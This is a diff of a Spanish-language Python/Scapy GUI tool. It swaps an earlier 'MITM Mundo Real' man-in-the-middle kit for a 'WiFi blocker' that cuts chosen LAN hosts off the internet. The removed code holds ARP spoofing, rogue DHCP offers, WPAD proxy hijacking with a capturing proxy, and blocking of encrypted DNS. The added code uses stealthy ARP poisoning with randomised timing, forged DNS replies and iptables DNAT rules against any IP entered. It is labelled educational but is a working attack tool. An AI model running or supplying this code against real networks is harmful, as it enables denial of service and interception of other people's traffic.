@@ -1,61 +1,69 @@
 
-
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-MITM Mundo Real v2 - DoH Killer Dinámico + WPAD Fake Proxy
-Automático, Rápido, Sigiloso, Anti-DoH Dinámico, Captura HTTPS
+BLOQUEADOR WIFI PROFESIONAL - Corte total de internet por IP
+Uso: Laboratorio educativo controlado - Demostración de seguridad de red
 """
 
 import tkinter as tk
-from tkinter import scrolledtext, messagebox, ttk
-from scapy.all import (ARP, Ether, send, srp, sniff, DNS, DNSQR, IP, UDP, 
-                       BOOTP, DHCP, TCP, conf, get_if_addr, get_if_hwaddr,
-                       Raw, Packet)
-import time
+from tkinter import messagebox, scrolledtext
 import threading
+import queue
+import time
 import os
-import random
 import sys
+import subprocess
 import socket
-import re
-from collections import defaultdict
+import random
 
-conf.verb = 0
+# Intentar importar scapy, si falla dar instrucciones
+try:
+    from scapy.all import ARP, Ether, send, srp, sniff, DNS, DNSQR, IP, UDP
+    from scapy.all import conf, get_if_addr, get_if_hwaddr
+    conf.verb = 0
+except ImportError:
+    print("ERROR: Scapy no instalado. Ejecutar: pip install scapy")
+    print("Luego ejecutar como root: sudo python3 bloqueador.py")
+    sys.exit(1)
 
-# ============== CONFIG GLOBAL ==============
-ip_gateway = None
-ip_atacante = None
-mac_atacante = None
-iface = None
+# ============== CONFIGURACIÓN GLOBAL ==============
+IP_GATEWAY = None
+IP_LOCAL = None
+MAC_LOCAL = None
+INTERFACE = None
 
-victimas = {}
-victimas_lock = threading.Lock()
-log_lock = threading.Lock()
+# Diccionario de objetivos: {ip: {'mac': str, 'evento': threading.Event(), 'activo': bool}}
+OBJETIVOS = {}
+LOCK_OBJETIVOS = threading.Lock()
 
-# Tracking dinámico de DoH
-conexiones_doh_detectadas = set()
-doh_lock = threading.Lock()
+# Cola thread-safe para mensajes minimalista
+COLA_LOG = queue.Queue()
 
-# WPAD Proxy
-wpad_activo = False
-proxy_socket = None
+# ============== FUNCIONES DE RED ==============
 
-# ============== FUNCIONES RED ==============
+def obtener_info_red():
+    """Obtiene información de red automáticamente"""
+    global IP_GATEWAY, IP_LOCAL, MAC_LOCAL, INTERFACE
 
-def get_network_info():
-    global ip_atacante, mac_atacante, iface, ip_gateway
     try:
-        iface = os.popen("ip route | grep default | awk '{print $5}' | head -n1").read().strip()
-        ip_atacante = get_if_addr(iface)
-        mac_atacante = get_if_hwaddr(iface)
-        ip_gateway = os.popen("ip route | grep default | awk '{print $3}' | head -n1").read().strip()
-        return True
-    except:
+        # Obtener interfaz por defecto
+        INTERFACE = subprocess.getoutput("ip route | grep default | awk '{print $5}' | head -n1").strip()
+        if not INTERFACE:
+            INTERFACE = "eth0"
+
+        IP_LOCAL = get_if_addr(INTERFACE)
+        MAC_LOCAL = get_if_hwaddr(INTERFACE)
+        IP_GATEWAY = subprocess.getoutput("ip route | grep default | awk '{print $3}' | head -n1").strip()
+
+        return bool(IP_GATEWAY and IP_LOCAL)
+    except Exception as e:
+        print(f"Error obteniendo info de red: {e}")
         return False
 
-def get_mac(ip, retries=3):
-    for _ in range(retries):
+def obtener_mac(ip, intentos=3):
+    """Obtiene MAC de IP con reintentos"""
+    for _ in range(intentos):
         try:
             pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
             ans = srp(pkt, timeout=2, verbose=0)[0]
@@ -63,715 +71,571 @@ def get_mac(ip, retries=3):
                 return rcv.hwsrc
         except:
             pass
-        time.sleep(0.2)
+        time.sleep(0.3)
     return None
 
-def is_root():
+def verificar_root():
+    """Verifica ejecución como root"""
     try:
         return os.geteuid() == 0
     except:
+        return False
+
+def activar_forwarding():
+    """Activa IP forwarding silenciosamente"""
+    try:
+        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null")
+        os.system("echo 1 > /proc/sys/net/ipv4/conf/all/forwarding 2>/dev/null")
+    except:
+        pass
+
+# ============== BLOQUEO DE INTERNET ==============
+
+def bloquear_dns_iptables(ip_objetivo):
+    """Bloquea DNS saliente de la IP objetivo via iptables"""
+    try:
+        # Bloquear DNS tradicional
+        os.system(f"iptables -A FORWARD -s {ip_objetivo} -p udp --dport 53 -j DROP 2>/dev/null")
+        os.system(f"iptables -A FORWARD -s {ip_objetivo} -p tcp --dport 53 -j DROP 2>/dev/null")
+
+        # Redirigir DNS al atacante (para responder 0.0.0.0)
+        os.system(f"iptables -t nat -A PREROUTING -s {ip_objetivo} -p udp --dport 53 -j DNAT --to-destination {IP_LOCAL}:53 2>/dev/null")
+
         return True
-
-def enable_forward():
-    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null")
-    os.system("echo 1 > /proc/sys/net/ipv4/conf/all/forwarding 2>/dev/null")
-
-# ============== DOH KILLER DINÁMICO ==============
-
-def doh_killer_dinamico(ip_victima, evento_stop, widget_salida, nombre):
-    """
-    Detecta y bloquea DoH dinámicamente:
-    1. Sniffa tráfico HTTPS de la víctima
-    2. Detecta patrones DoH (SNI, tamaños de paquete, timing)
-    3. Bloquea dinámicamente las IPs que comportan como DoH
-    4. Mantiene lista actualizada
-    """
-    global ip_atacante, conexiones_doh_detectadas
-
-    log_msg(f"[{nombre}] 🔍 DoH Killer Dinámico activado...")
-
-    # Patrones de SNI (Server Name Indication) típicos de DoH
-    doh_domains = [
-        b'cloudflare-dns.com', b'cloudflare-dns', b'dns.cloudflare.com',
-        b'dns.google', b'google-dns', b'dns.google.com',
-        b'doh.opendns.com', b'dns.quad9.net', b'doh.dns.sb',
-        b'dns.adguard.com', b'dns-family.adguard.com',
-        b'doh.cleanbrowsing.org', b'dns.digitale-gesellschaft.ch'
-    ]
-
-    # Tracking de conexiones sospechosas
-    conexiones_sospechosas = defaultdict(lambda: {'count': 0, 'last_seen': 0, 'domains': set()})
-
-    def analizar_paquete(pkt):
-        if evento_stop.is_set():
-            return True
-
-        if not (IP in pkt and TCP in pkt):
-            return False
-
-        src_ip = pkt[IP].src
-        dst_ip = pkt[IP].dst
-        dport = pkt[TCP].dport
-        sport = pkt[TCP].sport
-
-        # Solo analizar tráfico de la víctima
-        if src_ip != ip_victima and dst_ip != ip_victima:
-            return False
-
-        # Detectar HTTPS (puerto 443)
-        if dport == 443 or sport == 443:
-            # Analizar payload si existe
-            if Raw in pkt:
-                payload = bytes(pkt[Raw].load)
-
-                # Buscar SNI (Server Name Indication) en TLS Client Hello
-                # El SNI está en el handshake TLS, típicamente en los primeros bytes
-                for domain in doh_domains:
-                    if domain in payload:
-                        ip_doh = dst_ip if src_ip == ip_victima else src_ip
-
-                        with doh_lock:
-                            if ip_doh not in conexiones_doh_detectadas:
-                                conexiones_doh_detectadas.add(ip_doh)
-                                # Bloquear inmediatamente
-                                os.system(f"iptables -A FORWARD -s {ip_victima} -d {ip_doh} -p tcp --dport 443 -j DROP 2>/dev/null")
-                                os.system(f"iptables -A FORWARD -s {ip_victima} -d {ip_doh} -p tcp --sport 443 -j DROP 2>/dev/null")
-                                log_msg(f"[{nombre}] 🚫 DoH Detectado: {ip_doh} ({domain.decode()})")
-                                log_msg(f"[{nombre}] 🚫 Bloqueado dinámicamente via iptables")
-                        return False
-
-                # Heurística adicional: paquetes pequeños y frecuentes (patrón DoH)
-                # DoH típicamente envía consultas DNS encapsuladas en HTTPS (tamaño ~500-1500 bytes)
-                if 200 < len(payload) < 2000:
-                    ip_remota = dst_ip if src_ip == ip_victima else src_ip
-                    conexiones_sospechosas[ip_remota]['count'] += 1
-                    conexiones_sospechosas[ip_remota]['last_seen'] = time.time()
-
-                    # Si hay más de 10 conexiones rápidas a la misma IP 443, probablemente DoH
-                    if conexiones_sospechosas[ip_remota]['count'] > 10:
-                        tiempo_transcurrido = time.time() - conexiones_sospechosas[ip_remota]['last_seen']
-                        if tiempo_transcurrido < 5:  # 10 conexiones en menos de 5 segundos
-                            with doh_lock:
-                                if ip_remota not in conexiones_doh_detectadas:
-                                    conexiones_doh_detectadas.add(ip_remota)
-                                    os.system(f"iptables -A FORWARD -s {ip_victima} -d {ip_remota} -p tcp --dport 443 -j DROP 2>/dev/null")
-                                    log_msg(f"[{nombre}] ⚠️ DoH Heurístico: {ip_remota} (patrón de tráfico)")
-
-        # Limpiar conexiones antiguas cada 30 segundos
-        if random.random() < 0.01:  # 1% de probabilidad por paquete
-            ahora = time.time()
-            for ip in list(conexiones_sospechosas.keys()):
-                if ahora - conexiones_sospechosas[ip]['last_seen'] > 60:
-                    del conexiones_sospechosas[ip]
-
+    except:
         return False
 
+def desbloquear_dns_iptables(ip_objetivo):
+    """Remueve reglas iptables para IP objetivo"""
     try:
-        sniff(
-            filter=f"host {ip_victima} and port 443",
-            prn=analizar_paquete,
-            stop_filter=lambda x: evento_stop.is_set(),
-            store=0
-        )
-    except Exception as e:
-        log_msg(f"[{nombre}] Error DoH Killer: {e}")
+        os.system(f"iptables -D FORWARD -s {ip_objetivo} -p udp --dport 53 -j DROP 2>/dev/null")
+        os.system(f"iptables -D FORWARD -s {ip_objetivo} -p tcp --dport 53 -j DROP 2>/dev/null")
+        os.system(f"iptables -t nat -D PREROUTING -s {ip_objetivo} -p udp --dport 53 -j DNAT --to-destination {IP_LOCAL}:53 2>/dev/null")
+    except:
+        pass
 
-    log_msg(f"[{nombre}] DoH Killer detenido")
-
-# ============== WPAD FAKE PROXY ==============
-
-def wpad_fake_proxy(ip_victima, evento_stop, widget_salida, nombre):
+def ataque_arp_silencioso(ip_objetivo, mac_objetivo, evento_stop):
     """
-    WPAD (Web Proxy Auto-Discovery) Fake:
-    1. Responde a consultas DNS de wpad.dat con IP del atacante
-    2. Sirve archivo wpad.dat que configura proxy = atacante
-    3. La víctima envía TODO el tráfico HTTP/HTTPS al atacante
-    4. El atacante puede ver headers, intentar SSL strip, etc.
+    Ataque ARP minimalista y eficiente:
+    - Fase 1: Envenenamiento rápido (20s)
+    - Fase 2: Mantenimiento silencioso (cada 5-10s)
     """
-    global ip_atacante
+    global IP_GATEWAY, MAC_LOCAL
 
-    log_msg(f"[{nombre}] 🌐 WPAD Fake Proxy activando...")
-
-    # Configurar DNS para wpad.local, wpad.lan, etc.
-    dominios_wpad = ['wpad', 'wpad.local', 'wpad.lan', 'wpad.home.arpa']
-
-    def dns_wpad_handler(pkt):
-        if evento_stop.is_set():
-            return True
-
-        if DNS in pkt and pkt[DNS].qr == 0:
-            try:
-                dominio = pkt[DNSQR].qname.decode('utf-8', errors='ignore').rstrip('.').lower()
-
-                if any(w in dominio for w in dominios_wpad):
-                    # Responder con IP del atacante
-                    respuesta = IP(dst=pkt[IP].src, src=pkt[IP].dst) /                                UDP(dport=pkt[UDP].sport, sport=53) /                                DNS(id=pkt[DNS].id, qr=1, aa=1,
-                                   qd=DNSQR(qname=dominio),
-                                   an=DNSRR(rrname=dominio, ttl=300, rdata=ip_atacante))
-
-                    send(respuesta, verbose=0)
-                    log_msg(f"[{nombre}] WPAD DNS: {dominio} -> {ip_atacante}")
-
-                    # Iniciar servidor HTTP para wpad.dat si no está corriendo
-                    iniciar_servidor_wpad(ip_atacante)
-            except:
-                pass
-        return False
-
-    try:
-        sniff(
-            filter=f"udp port 53 and host {ip_victima}",
-            prn=dns_wpad_handler,
-            stop_filter=lambda x: evento_stop.is_set(),
-            store=0
-        )
-    except Exception as e:
-        log_msg(f"[{nombre}] Error WPAD: {e}")
-
-    log_msg(f"[{nombre}] WPAD detenido")
-
-def iniciar_servidor_wpad(ip):
-    """Inicia servidor HTTP simple para servir wpad.dat"""
-    global wpad_activo
-
-    if wpad_activo:
-        return  # Ya está corriendo
-
-    wpad_activo = True
-
-    def servidor():
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            sock.bind((ip, 80))
-            sock.listen(5)
-
-            log_msg(f"🌐 Servidor WPAD en {ip}:80")
-
-            # Contenido del archivo wpad.dat (configuración proxy)
-            wpad_content = f"""function FindProxyForURL(url, host) {{
-    return "PROXY {ip}:8080; DIRECT";
-}}"""
-
-            while True:
-                try:
-                    sock.settimeout(1.0)
-                    conn, addr = sock.accept()
-                    data = conn.recv(1024)
-
-                    if b'wpad.dat' in data or b'GET /' in data:
-                        response = f"""HTTP/1.1 200 OK
-Content-Type: application/x-ns-proxy-autoconfig
-Content-Length: {len(wpad_content)}
-
-{wpad_content}"""
-                        conn.send(response.encode())
-                        log_msg(f"🌐 WPAD.dat servido a {addr}")
-
-                    conn.close()
-                except socket.timeout:
-                    continue
-                except:
-                    pass
-        except Exception as e:
-            log_msg(f"Error servidor WPAD: {e}")
-
-    hilo = threading.Thread(target=servidor, daemon=True)
-    hilo.start()
-
-    # También iniciar proxy transparente en 8080
-    iniciar_proxy_transparente(ip)
-
-def iniciar_proxy_transparente(ip):
-    """Proxy simple en 8080 para capturar tráfico"""
-    def proxy():
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            sock.bind((ip, 8080))
-            sock.listen(10)
-
-            log_msg(f"🔍 Proxy transparente en {ip}:8080")
-
-            while True:
-                try:
-                    sock.settimeout(1.0)
-                    conn, addr = sock.accept()
-                    # Aquí podrías implementar SSL strip o logging
-                    # Por ahora solo logueamos que hay conexión
-                    data = conn.recv(4096)
-                    if data:
-                        # Intentar parsear host destino
-                        try:
-                            host = None
-                            if b'Host: ' in data:
-                                host = data.split(b'Host: ')[1].split(b'\r\n')[0].decode()
-                            elif b'CONNECT ' in data:
-                                host = data.split(b'CONNECT ')[1].split(b' ')[0].decode()
-
-                            if host:
-                                log_msg(f"🔍 Proxy: Conexión a {host} desde {addr}")
-                        except:
-                            pass
-
-                    # Cerrar (o reenviar al destino real si quieres MITM completo)
-                    conn.close()
-                except socket.timeout:
-                    continue
-                except:
-                    pass
-        except Exception as e:
-            log_msg(f"Error proxy: {e}")
-
-    hilo = threading.Thread(target=proxy, daemon=True)
-    hilo.start()
-
-# ============== ARP HÍBRIDO (RÁPIDO + SIGILOSO) ==============
-
-def arp_hibrido(ip_victima, mac_victima, evento_stop, widget_salida, nombre):
-    global ip_gateway, mac_atacante
-
-    mac_gateway = get_mac(ip_gateway)
+    mac_gateway = obtener_mac(IP_GATEWAY)
     if not mac_gateway:
         return
 
-    log_msg(f"[{nombre}] 🚀 FASE 1: Infección rápida...")
-
+    # FASE 1: Envenenamiento rápido (20 segundos)
     inicio = time.time()
-    while not evento_stop.is_set() and (time.time() - inicio) < 30:
+    while not evento_stop.is_set() and (time.time() - inicio) < 20:
         try:
-            send(ARP(pdst=ip_victima, hwdst=mac_victima, 
-                    psrc=ip_gateway, hwsrc=mac_atacante, op=2), verbose=0)
-            send(ARP(pdst=ip_gateway, hwdst=mac_gateway,
-                    psrc=ip_victima, hwsrc=mac_atacante, op=2), verbose=0)
+            # A víctima: soy el gateway
+            send(ARP(pdst=ip_objetivo, hwdst=mac_objetivo, 
+                    psrc=IP_GATEWAY, hwsrc=MAC_LOCAL, op=2), verbose=0, count=1)
+
+            time.sleep(0.1)
+
+            # A gateway: soy la víctima
+            send(ARP(pdst=IP_GATEWAY, hwdst=mac_gateway,
+                    psrc=ip_objetivo, hwsrc=MAC_LOCAL, op=2), verbose=0, count=1)
+
             time.sleep(1)
         except:
             pass
 
     if evento_stop.is_set():
-        restaurar_arp(ip_victima, mac_victima, mac_gateway, nombre)
+        restaurar_arp(ip_objetivo, mac_objetivo, mac_gateway)
         return
 
-    log_msg(f"[{nombre}] 🥷 FASE 2: Sigiloso...")
-
-    def handler(pkt):
-        if evento_stop.is_set():
-            return True
-        if ARP in pkt and pkt[ARP].op == 1:
-            if pkt[ARP].pdst == ip_gateway:
-                send(ARP(op=2, pdst=pkt[ARP].psrc, hwdst=pkt[ARP].hwsrc,
-                        psrc=ip_gateway, hwsrc=mac_atacante), verbose=0)
-            if pkt[ARP].pdst == ip_victima and pkt[ARP].psrc == ip_gateway:
-                send(ARP(op=2, pdst=ip_gateway, hwdst=mac_gateway,
-                        psrc=ip_victima, hwsrc=mac_atacante), verbose=0)
-        return False
-
-    try:
-        sniff(filter="arp", prn=handler, 
-              stop_filter=lambda x: evento_stop.is_set(), store=0)
-    except:
-        pass
-    finally:
-        restaurar_arp(ip_victima, mac_victima, mac_gateway, nombre)
-
-def restaurar_arp(ip_v, mac_v, mac_gw, nombre):
-    try:
-        for _ in range(5):
-            send(ARP(pdst=ip_v, hwdst=mac_v, psrc=ip_gateway, hwsrc=mac_gw, op=2), verbose=0)
-            send(ARP(pdst=ip_gateway, hwdst=mac_gw, psrc=ip_v, hwsrc=mac_v, op=2), verbose=0)
-            time.sleep(0.3)
-        log_msg(f"[{nombre}] ✅ ARP restaurado")
-    except:
-        pass
-
-# ============== DHCP AGRESIVO ==============
-
-def dhcp_agresivo(ip_victima, mac_victima, evento_stop, widget_salida, nombre):
-    global ip_atacante, mac_atacante
-
-    log_msg(f"[{nombre}] 🎭 DHCP AGRESIVO...")
-
-    try:
-        mac_bytes = bytes.fromhex(mac_victima.replace(':', ''))
-    except:
-        mac_bytes = b'\x00' * 6
-
-    def crear_oferta():
-        pkt = Ether(dst="ff:ff:ff:ff:ff:ff") /               IP(src=ip_atacante, dst="255.255.255.255") /               UDP(sport=67, dport=68) /               BOOTP(op=2, yiaddr=ip_victima, siaddr=ip_atacante,
-                    giaddr=ip_atacante, chaddr=mac_bytes,
-                    xid=random.randint(1, 999999)) /               DHCP(options=[
-                  ("message-type", 2),
-                  ("server_id", ip_atacante),
-                  ("subnet_mask", "255.255.255.0"),
-                  ("router", ip_atacante),
-                  ("dns_server", ip_atacante),
-                  ("lease_time", 30),
-                  ("renewal_time", 10),
-                  "end"
-              ])
-        return pkt
-
-    log_msg(f"[{nombre}] 💣 Bombardeo 5s...")
-    for _ in range(10):
-        if evento_stop.is_set():
-            break
-        sendp(crear_oferta(), verbose=0)
-        time.sleep(0.5)
-
-    log_msg(f"[{nombre}] 🔄 Manteniendo...")
+    # FASE 2: Mantenimiento silencioso (mínimo tráfico)
     while not evento_stop.is_set():
         try:
-            sendp(crear_oferta(), verbose=0)
-            evento_stop.wait(10)
+            # Un solo par de paquetes cada 5-10 segundos (aleatorio para no ser predecible)
+            send(ARP(pdst=ip_objetivo, hwdst=mac_objetivo, 
+                    psrc=IP_GATEWAY, hwsrc=MAC_LOCAL, op=2), verbose=0, count=1)
+            time.sleep(0.05)
+            send(ARP(pdst=IP_GATEWAY, hwdst=mac_gateway,
+                    psrc=ip_objetivo, hwsrc=MAC_LOCAL, op=2), verbose=0, count=1)
+
+            # Esperar con jitter
+            evento_stop.wait(random.uniform(5.0, 10.0))
         except:
             pass
 
-# ============== BLOQUEO DNS TRADICIONAL ==============
+    # Restaurar al detener
+    restaurar_arp(ip_objetivo, mac_objetivo, mac_gateway)
 
-def bloquear_dns_tradicional(ip_victima, activar=True):
-    if activar:
-        os.system(f"iptables -A FORWARD -s {ip_victima} -p udp --dport 53 -j DROP 2>/dev/null")
-        os.system(f"iptables -A FORWARD -s {ip_victima} -p tcp --dport 53 -j DROP 2>/dev/null")
-        os.system(f"iptables -t nat -A PREROUTING -s {ip_victima} -p udp --dport 53 -j DNAT --to-destination {ip_atacante}:53 2>/dev/null")
-
-def dns_falso(ip_victima, evento_stop, nombre):
-    def handler(pkt):
-        if evento_stop.is_set():
-            return True
-        if DNS in pkt and pkt[DNS].qr == 0:
-            try:
-                dom = pkt[DNSQR].qname.decode('utf-8', errors='ignore').rstrip('.')
-                if "arpa" in dom:
-                    return False
-                resp = IP(dst=pkt[IP].src, src=pkt[IP].dst) /                        UDP(dport=pkt[UDP].sport, sport=53) /                        DNS(id=pkt[DNS].id, qr=1, aa=1,
-                           qd=DNSQR(qname=dom),
-                           an=DNSRR(rrname=dom, ttl=86400, rdata="0.0.0.0"))
-                send(resp, verbose=0)
-                log_msg(f"[{nombre}] DNS: {dom} -> 0.0.0.0")
-            except:
-                pass
-        return False
-
+def restaurar_arp(ip_objetivo, mac_objetivo, mac_gateway):
+    """Restaura tablas ARP a valores correctos"""
     try:
-        sniff(filter=f"udp port 53 and host {ip_victima}", 
-              prn=handler, stop_filter=lambda x: evento_stop.is_set(), store=0)
+        for _ in range(3):
+            send(ARP(pdst=ip_objetivo, hwdst=mac_objetivo, 
+                    psrc=IP_GATEWAY, hwsrc=mac_gateway, op=2), verbose=0, count=1)
+            send(ARP(pdst=IP_GATEWAY, hwdst=mac_gateway,
+                    psrc=ip_objetivo, hwsrc=mac_objetivo, op=2), verbose=0, count=1)
+            time.sleep(0.5)
     except:
         pass
 
-# ============== CONTROLADORES GUI ==============
+def responder_dns_nulo(ip_objetivo, evento_stop):
+    """
+    Responde consultas DNS con 0.0.0.0 (no resuelve nada)
+    """
+    def handler(pkt):
+        if evento_stop.is_set():
+            return True
 
-def log_msg(msg):
-    with log_lock:
         try:
-            widget_salida.insert(tk.END, msg + "\n")
-            widget_salida.see(tk.END)
+            if DNS in pkt and pkt[DNS].qr == 0:  # Es consulta
+                # Solo responder si es de la víctima
+                if pkt[IP].src != ip_objetivo and pkt[IP].dst != ip_objetivo:
+                    return False
+
+                dominio = pkt[DNSQR].qname.decode('utf-8', errors='ignore').rstrip('.')
+
+                # Ignorar consultas ARPA
+                if "in-addr.arpa" in dominio:
+                    return False
+
+                # Responder con 0.0.0.0 (no existe)
+                respuesta = IP(dst=pkt[IP].src, src=pkt[IP].dst) /                            UDP(dport=pkt[UDP].sport, sport=53) /                            DNS(id=pkt[DNS].id, qr=1, aa=1,
+                               qd=DNSQR(qname=dominio),
+                               an=DNSRR(rrname=dominio, ttl=300, rdata="0.0.0.0"))
+
+                send(respuesta, verbose=0, count=1)
         except:
             pass
 
-def agregar():
-    global victimas
-    ip = entrada_ip.get().strip()
-    nombre = entrada_nombre.get().strip() or f"Target_{len(victimas)}"
-    modo = modo_sel.get()
-
-    if not ip or ip == ip_gateway:
-        return
+        return False
 
     try:
-        octetos = ip.split('.')
-        if len(octetos) != 4 or not all(o.isdigit() and 0 <= int(o) <= 255 for o in octetos):
+        sniff(
+            filter=f"udp port 53 and host {ip_objetivo}",
+            prn=handler,
+            stop_filter=lambda x: evento_stop.is_set(),
+            store=0,
+            timeout=2  # Timeout corto para verificar evento frecuentemente
+        )
+    except:
+        pass
+
+def worker_bloqueo(ip_objetivo, mac_objetivo, nombre):
+    """
+    Worker principal de bloqueo:
+    1. Bloquea DNS via iptables
+    2. Inicia ARP spoofing
+    3. Responde DNS con 0.0.0.0
+    """
+    global OBJETIVOS, LOCK_OBJETIVOS
+
+    with LOCK_OBJETIVOS:
+        if ip_objetivo not in OBJETIVOS:
+            return
+        evento = OBJETIVOS[ip_objetivo]['evento']
+
+    # 1. Bloquear DNS
+    bloquear_dns_iptables(ip_objetivo)
+
+    # 2. Iniciar ARP spoofing en hilo separado
+    hilo_arp = threading.Thread(
+        target=ataque_arp_silencioso,
+        args=(ip_objetivo, mac_objetivo, evento),
+        daemon=True
+    )
+    hilo_arp.start()
+
+    # 3. Responder DNS nulo (bloqueo adicional)
+    responder_dns_nulo(ip_objetivo, evento)
+
+    # Esperar a que se detenga
+    while not evento.is_set():
+        time.sleep(0.5)
+
+    # Limpieza
+    desbloquear_dns_iptables(ip_objetivo)
+
+    with LOCK_OBJETIVOS:
+        if ip_objetivo in OBJETIVOS:
+            OBJETIVOS[ip_objetivo]['activo'] = False
+
+# ============== INTERFAZ MINIMALISTA ==============
+
+def log(msg):
+    """Agrega mensaje a cola de log"""
+    COLA_LOG.put(msg)
+
+def actualizar_log():
+    """Actualiza log desde hilo principal"""
+    try:
+        while True:
+            msg = COLA_LOG.get_nowait()
+            txt_log.insert(tk.END, msg + "\n")
+            txt_log.see(tk.END)
+    except queue.Empty:
+        pass
+    ventana.after(100, actualizar_log)
+
+def agregar_objetivo():
+    """Agrega IP objetivo a la lista"""
+    global OBJETIVOS, LOCK_OBJETIVOS
+
+    ip = entry_ip.get().strip()
+    nombre = entry_nombre.get().strip() or f"Objetivo_{len(OBJETIVOS)+1}"
+
+    if not ip:
+        return
+
+    if ip == IP_GATEWAY:
+        messagebox.showerror("Error", "No puede bloquear la gateway")
+        return
+
+    # Validar IP
+    try:
+        partes = ip.split('.')
+        if len(partes) != 4 or not all(p.isdigit() and 0 <= int(p) <= 255 for p in partes):
             raise ValueError
     except:
         messagebox.showwarning("Error", "IP inválida")
         return
 
-    with victimas_lock:
-        if ip in victimas:
-            messagebox.showwarning("Error", "IP ya existe")
+    with LOCK_OBJETIVOS:
+        if ip in OBJETIVOS:
+            messagebox.showwarning("Error", "IP ya está en la lista")
             return
 
-    log_msg(f"🔍 Escaneando {ip}...")
+    # Verificar que responde
+    log(f"🔍 Verificando {ip}...")
     ventana.update()
 
-    mac = get_mac(ip)
+    mac = obtener_mac(ip)
     if not mac:
-        messagebox.showwarning("Error", "No responde a ARP")
+        messagebox.showwarning("No responde", f"{ip} no responde a ARP")
         return
 
-    with victimas_lock:
-        victimas[ip] = {
-            'nombre': nombre, 'mac': mac, 'modo': modo, 'activo': False,
-            'evento': threading.Event(), 'hilo': None,
-            'evento_dns': threading.Event(), 'hilo_dns': None,
-            'evento_doh': threading.Event(), 'hilo_doh': None,
-            'evento_wpad': threading.Event(), 'hilo_wpad': None
+    with LOCK_OBJETIVOS:
+        OBJETIVOS[ip] = {
+            'nombre': nombre,
+            'mac': mac,
+            'activo': False,
+            'evento': threading.Event()
         }
 
-    entrada_ip.delete(0, tk.END)
-    log_msg(f"✅ {nombre} [{modo}] agregado")
-    actualizar()
+    entry_ip.delete(0, tk.END)
+    entry_nombre.delete(0, tk.END)
+    log(f"✅ {nombre} ({ip}) agregado")
+    actualizar_lista()
 
-def iniciar(ip):
-    global victimas, wpad_activo
+def iniciar_bloqueo(ip):
+    """Inicia bloqueo de IP específica"""
+    global OBJETIVOS, LOCK_OBJETIVOS
 
-    with victimas_lock:
-        if ip not in victimas or victimas[ip]['activo']:
+    with LOCK_OBJETIVOS:
+        if ip not in OBJETIVOS or OBJETIVOS[ip]['activo']:
             return
 
-        datos = victimas[ip]
-        datos['activo'] = True
-        datos['evento'] = threading.Event()
-        datos['evento_dns'] = threading.Event()
-        datos['evento_doh'] = threading.Event()
-        datos['evento_wpad'] = threading.Event()
-        modo = datos['modo']
+        OBJETIVOS[ip]['activo'] = True
+        OBJETIVOS[ip]['evento'] = threading.Event()
+        datos = OBJETIVOS[ip]
 
-        # ARP base (todos los modos lo necesitan)
-        if modo in ["rapido", "sigiloso", "total", "doh_killer", "wpad"]:
-            target = arp_hibrido if modo != "sigiloso" else pasivo_puro
-            hilo = threading.Thread(
-                target=target,
-                args=(ip, datos['mac'], datos['evento'], widget_salida, datos['nombre']),
-                daemon=True
-            )
-            datos['hilo'] = hilo
-            hilo.start()
+    # Iniciar worker
+    hilo = threading.Thread(
+        target=worker_bloqueo,
+        args=(ip, datos['mac'], datos['nombre']),
+        daemon=True
+    )
+    hilo.start()
 
-        # DHCP
-        if modo == "dhcp_agresivo":
-            hilo = threading.Thread(
-                target=dhcp_agresivo,
-                args=(ip, datos['mac'], datos['evento'], widget_salida, datos['nombre']),
-                daemon=True
-            )
-            datos['hilo'] = hilo
-            hilo.start()
+    log(f"🔴 BLOQUEANDO: {datos['nombre']} ({ip})")
+    actualizar_lista()
 
-        # DNS tradicional + DoH Block
-        if modo in ["total", "doh_killer"]:
-            bloquear_dns_tradicional(ip, True)
+def detener_bloqueo(ip):
+    """Detiene bloqueo de IP"""
+    global OBJETIVOS, LOCK_OBJETIVOS
 
-            # DNS falso
-            hilo_dns = threading.Thread(
-                target=dns_falso,
-                args=(ip, datos['evento_dns'], datos['nombre']),
-                daemon=True
-            )
-            datos['hilo_dns'] = hilo_dns
-            hilo_dns.start()
-
-            # DoH Killer Dinámico (lo nuevo)
-            hilo_doh = threading.Thread(
-                target=doh_killer_dinamico,
-                args=(ip, datos['evento_doh'], widget_salida, datos['nombre']),
-                daemon=True
-            )
-            datos['hilo_doh'] = hilo_doh
-            hilo_doh.start()
-
-        # WPAD Fake Proxy (lo nuevo)
-        if modo == "wpad" or modo == "total":
-            hilo_wpad = threading.Thread(
-                target=wpad_fake_proxy,
-                args=(ip, datos['evento_wpad'], widget_salida, datos['nombre']),
-                daemon=True
-            )
-            datos['hilo_wpad'] = hilo_wpad
-            hilo_wpad.start()
-
-    log_msg(f"🚀 [{datos['nombre']}] {modo} INICIADO")
-    actualizar()
-
-def pasivo_puro(ip_v, mac_v, evento, widget, nombre):
-    global ip_gateway, mac_atacante
-    mac_gw = get_mac(ip_gateway)
-    if not mac_gw:
-        return
-
-    def handler(pkt):
-        if evento.is_set():
-            return True
-        if ARP in pkt and pkt[ARP].op == 1:
-            if pkt[ARP].pdst == ip_gateway:
-                send(ARP(op=2, pdst=pkt[ARP].psrc, hwdst=pkt[ARP].hwsrc,
-                        psrc=ip_gateway, hwsrc=mac_atacante), verbose=0)
-            if pkt[ARP].pdst == ip_v and pkt[ARP].psrc == ip_gateway:
-                send(ARP(op=2, pdst=ip_gateway, hwdst=mac_gw,
-                        psrc=ip_v, hwsrc=mac_atacante), verbose=0)
-        return False
-
-    send(ARP(op=2, pdst=ip_v, hwdst=mac_v, psrc=ip_gateway, hwsrc=mac_atacante), verbose=0)
-    try:
-        sniff(filter="arp", prn=handler, stop_filter=lambda x: evento.is_set(), store=0)
-    finally:
-        restaurar_arp(ip_v, mac_v, mac_gw, nombre)
-
-def detener(ip):
-    global victimas
-    with victimas_lock:
-        if ip not in victimas or not victimas[ip]['activo']:
+    with LOCK_OBJETIVOS:
+        if ip not in OBJETIVOS or not OBJETIVOS[ip]['activo']:
             return
-        datos = victimas[ip]
